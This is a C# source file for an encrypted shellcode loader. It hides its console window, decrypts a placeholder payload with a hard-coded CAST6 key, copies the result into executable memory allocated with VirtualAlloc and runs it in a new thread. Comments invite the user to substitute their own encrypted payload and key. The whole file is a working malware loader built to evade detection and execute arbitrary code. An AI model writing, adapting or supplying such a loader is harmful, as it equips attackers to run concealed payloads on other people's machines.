using System;
using System.Runtime.InteropServices;
using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Paddings;
using Org.BouncyCastle.Crypto.Parameters;

// Make sure you add BouncyCastle.Crypto.dll to the project

class Decryption
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint Size, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    static void Main()
    {
        var lockup = GetConsoleWindow();
        ShowWindow(lockup, 0);

        // Replace this with your encrypted payload
        byte[] encryptedData = new byte[4] { 0x85, 0x16, 0x1E, 0x78};
        // Replace this with youe actual kay
        string keyString = "Ir0nHu1k!";
        int keySize = Math.Max(10, Math.Min(32, keyString.Length));
        byte[] key = new byte[32];
        Array.Copy(Encoding.UTF8.GetBytes(keyString), key, Math.Min(keySize, keyString.Length));
        Cast6Engine engine = new Cast6Engine();
        KeyParameter keyParam = new KeyParameter(key);
        ParametersWithIV keyParamWithIV = new ParametersWithIV(keyParam, new byte[engine.GetBlockSize()]);
        BufferedBlockCipher cipher = new PaddedBufferedBlockCipher(new CbcBlockCipher(engine));
        cipher.Init(false, keyParamWithIV);
        byte[] decrypted = DecryptData(cipher, encryptedData);
        Fire(decrypted);

    }
    public static void Fire(byte[] round)
    {
        IntPtr barrel = VirtualAlloc(IntPtr.Zero, (UInt32)round.Length, 0x3000, 0x40);
        Marshal.Copy(round, 0, barrel, round.Length);
        IntPtr trigger = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr hammer = IntPtr.Zero;
        hammer = CreateThread(IntPtr.Zero, 0, barrel, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hammer, 0xFFFFFFFF);
    }
    static byte[] DecryptData(BufferedBlockCipher cipher, byte[] encryptedData)
    {
        int outputSize = cipher.GetOutputSize(encryptedData.Length);
        byte[] output = new byte[outputSize];
        int bytesProcessed = cipher.ProcessBytes(encryptedData, 0, encryptedData.Length, output, 0);
        cipher.DoFinal(output, bytesProcessed);

        return output;
    }
}
